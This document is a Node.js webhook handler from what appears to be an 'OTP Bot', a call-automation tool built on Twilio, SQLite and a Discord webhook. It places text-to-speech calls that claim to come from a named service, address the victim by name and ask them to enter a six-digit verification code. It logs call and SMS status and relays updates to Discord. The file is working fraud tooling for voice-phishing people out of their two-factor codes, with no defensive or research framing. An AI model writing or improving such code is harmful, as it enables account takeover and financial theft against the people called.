const ttsService = require('../services/tts');
const config = require('.././config');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

// Initialize TTS service
ttsService.init(config.tts);

// Initialize Discord webhook if configured
const discordWebhook = new Webhook(config.discordwebhook || '');
const db = new sqlite3.Database('./db/data.db');

module.exports = function(req, res) {
  const {
    ApiPassword,
    CallSid,
    CallStatus,
    From,
    To,
    SmsStatus
  } = req.body;

  // Validate API password
  if (ApiPassword !== config.apipassword) {
    return res.status(401).json({ error: 'Invalid API password' });
  }

  // Handle call status updates
  if (CallSid) {
    const now = new Date().toISOString();
    
    if (CallStatus !== undefined) {
      // Update call status in database
      db.run(
        'UPDATE calls SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE callSid = ?',
        [CallStatus, From, To, now, CallSid],
        function(err) {
          if (err) {
            console.error('Database update error:', err);
            return res.status(500).json({ error: 'Database error' });
          }
          
          // If call is answered/in progress, trigger TTS
          if (CallStatus === 'in-progress' || CallStatus === 'completed') {
            // Get call details to personalize TTS message
            db.get(
              'SELECT service, name, otplength FROM calls WHERE callSid = ?',
              [CallSid],
              (err, row) => {
                if (err) {
                  console.error('Database query error:', err);
                } else {
                  const service = row?.service || 'Unknown';
                  const name = row?.name || 'User';
                  
                  // Generate TTS message
                  const ttsMessage = `Hello ${name}, this is a call from ${service} service. Please enter your verification code.`;
                  
                  // Synthesize speech
                  ttsService.synthesize(ttsMessage, {
                    provider: config.tts.defaultProvider,
                    language: config.tts.defaultLanguage,
                    voice: config.tts.defaultVoice
                  })
                  .then(async (audioBuffer) => {
                    // Save audio file and get URL for TwiML
                    const filename = `tts_${CallSid}_${Date.now()}.mp3`;
                    const uploadsDir = path.join(__dirname, '../public/audio');
                    
                    if (!fs.existsSync(uploadsDir)) {
                      fs.mkdirSync(uploadsDir, { recursive: true });
                    }
                    
                    const filePath = path.join(uploadsDir, filename);
                    fs.writeFileSync(filePath, audioBuffer);
                    
                    // Return TwiML with Play verb for TTS audio
                    const serverUrl = config.serverurl || `http://localhost:${config.port}`;
                    const twiml = `<?xml version="1.0" encoding="UTF-8"?><Response><Play>${serverUrl}/audio/${filename}</Play><Gather timeout="10" numDigits="6"><Say>Please enter your verification code</Say></Gather></Response>`;
                    
                    res.type('text/xml');
                    res.send(twiml);
                  })
                  .catch((ttsError) => {
                    console.error('TTS error:', ttsError);
                    // Fallback to default TwiML if TTS fails
                    const twiml = `<?xml version="1.0" encoding="UTF-8"?><Response><Say>Hello, please enter your verification code</Say><Gather timeout="10" numDigits="6"></Gather></Response>`;
                    res.type('text/xml');
                    res.send(twiml);
                  });
                }
              }
            );
          } else {
            // For other statuses, just return success
            res.json({ inserted: 'All is alright.' });
          }
        }
      );
    } 
    // Handle SMS status updates
    else if (SmsStatus !== undefined) {
      // Insert SMS record
      db.run(
        'INSERT INTO calls (itsfrom, itsto, status, date) VALUES (?, ?, ?, ?)',
        [From, To, SmsStatus, now],
        function(err) {
          if (err) {
            console.error('Database insert error:', err);
            return res.status(500).json({ error: 'Database error' });
          }
          
          // Send Discord notification if webhook is configured
          if (config.discordwebhook) {
            const embed = new MessageBuilder()
              .setTitle('OTP Bot')
              .setColor('#0099ff')
              .setDescription(`**Status:** ${SmsStatus}\n**From:** ${From}\n**To:** ${To}\n**Time:** ${now}`)
              .setTimestamp()
              .setFooter('OTP Bot');
              
            discordWebhook.send(embed);
          }
          
          res.json({ inserted: 'All is alright.' });
        }
      );
    } else {
      res.status(400).json({ error: 'Missing CallStatus or SmsStatus' });
    }
  } else {
    res.status(400).json({ error: 'Missing CallSid' });
  }
};